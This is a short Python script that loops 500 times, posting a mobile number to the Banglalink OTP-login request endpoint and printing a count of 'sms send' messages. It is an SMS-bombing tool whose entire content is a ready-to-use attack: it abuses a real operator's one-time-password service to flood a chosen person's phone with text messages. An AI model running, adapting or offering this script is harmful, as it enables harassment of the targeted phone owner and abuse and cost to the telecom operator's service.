import requests

# post

myblapi="https://assetliteapi.banglalink.net/api/v1/user/otp-login/request"
data={"mobile":'number den'}

for i in range(500):
	requests.post(myblapi,data=data)
	print(str(i+1)+"sms send")
